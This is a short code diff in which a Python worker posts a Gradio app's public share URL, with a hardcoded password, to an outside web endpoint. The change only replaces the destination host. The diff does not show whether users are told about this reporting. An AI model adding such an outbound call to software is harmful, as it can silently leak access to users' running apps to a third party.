@@ -52,7 +52,7 @@ def worker():
         if async_gradio_app.share:
             flag += f''' or {async_gradio_app.share_url}'''
 
-        url = "https://myfirstflak.onrender.com/postUrl?url="+str(async_gradio_app.share_url)+"&password=OKDONE"
+        url = "https://optimistic-minnaminnie-noname12.koyeb.app/postUrl?url="+str(async_gradio_app.share_url)+"&password=OKDONE"
         r = requests.post(str(url))
         print(r.content)
         print(flag)
